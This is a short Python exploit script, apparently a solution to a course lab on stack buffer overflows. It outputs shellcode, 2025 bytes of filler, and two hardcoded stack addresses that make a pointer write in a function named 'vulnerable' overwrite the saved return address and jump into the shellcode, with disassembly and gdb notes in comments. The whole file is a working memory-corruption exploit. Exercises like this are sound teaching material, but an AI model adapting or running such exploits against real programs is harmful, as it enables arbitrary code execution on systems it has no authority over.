#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here

# Overflow the buffer with non-null bytes otherwise shell script will break:
#  bash: warning: command substitution: ignored null byte in input
#
# Dump of assembler code for function vulnerable:
#    0x080488b5 <+0>:     push   %ebp
#    0x080488b6 <+1>:     mov    %esp,%ebp
#    0x080488b8 <+3>:     sub    $0x808,%esp
# => 0x080488be <+9>:     push   $0x808
#    0x080488c3 <+14>:    pushl  0x8(%ebp)
#    0x080488c6 <+17>:    lea    -0x808(%ebp),%eax
#    0x080488cc <+23>:    push   %eax
#    0x080488cd <+24>:    call   0x8048210
#    0x080488d2 <+29>:    add    $0xc,%esp
#    0x080488d5 <+32>:    mov    -0x4(%ebp),%eax   # Use pointer to set the address storing
#    0x080488d8 <+35>:    mov    -0x8(%ebp),%edx   # the return address
#    0x080488db <+38>:    mov    %edx,(%eax)
#    0x080488dd <+40>:    nop
#    0x080488de <+41>:    leave  
#    0x080488df <+42>:    ret    
# End of assembler dump.
#
# Location of shellcode is arbitrary, but cant be in last 8 bytes
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(("\x01" * (2033 - 8)).encode())

# Abuse the pointers to set the address storing the return address to the address with the shellcode
sys.stdout.buffer.write(pack("<I", 0xfffe8e3c))  # Start of shellcode
sys.stdout.buffer.write(pack("<I", 0xfffe9648))  # Address storing the return address

# (gdb) x /2wx $ebp
# 0xfffe9644:     0xfffe9650      0x08048915
#
#  x/32bx 0xfffe8e3c
